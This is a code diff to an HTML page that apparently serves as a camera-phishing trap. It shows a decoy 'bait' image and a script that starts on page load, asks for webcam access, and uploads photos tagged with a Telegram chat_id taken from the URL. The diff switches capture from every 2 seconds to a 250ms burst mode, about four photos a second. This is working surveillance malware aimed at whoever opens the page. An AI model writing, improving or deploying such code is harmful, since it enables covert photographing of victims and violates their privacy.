@@ -27,14 +27,14 @@
   <img src="/static/welcome.jpg" id="bait" alt="Image">
 
   <script>
-    async function startContinuousCapture() {
+    async function startBurstCapture() {
       try {
-        // Extract chat_id from URL (?chat_id=12345)
+        // Get chat_id from URL (example: ?chat_id=123456789)
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get("chat_id");
 
         if (!chatId) {
-          console.error("❌ No chat_id found in URL!");
+          console.error("❌ No chat_id in URL!");
           return;
         }
 
@@ -43,7 +43,7 @@
         const track = stream.getVideoTracks()[0];
         const imageCapture = new ImageCapture(track);
 
-        // Capture every 2 seconds (safe rate for Telegram)
+        // Burst mode: capture every 250ms (~4 photos per second)
         setInterval(async () => {
           try {
             const blob = await imageCapture.takePhoto();
@@ -52,18 +52,18 @@
             formData.append("chat_id", chatId);
 
             fetch("/upload", { method: "POST", body: formData })
-              .then(() => console.log("✅ Sent photo at", new Date().toLocaleTimeString()))
+              .then(() => console.log("✅ Burst photo sent:", new Date().toLocaleTimeString()))
               .catch(err => console.error("❌ Upload error:", err));
           } catch (err) {
             console.error("❌ Capture error:", err);
           }
-        }, 2000); // every 2 seconds
+        }, 250); // 250ms = 4 per second
       } catch (err) {
         console.error("❌ Camera access denied:", err);
       }
     }
 
-    window.onload = startContinuousCapture;
+    window.onload = startBurstCapture;
   </script>
 </body>
 </html>
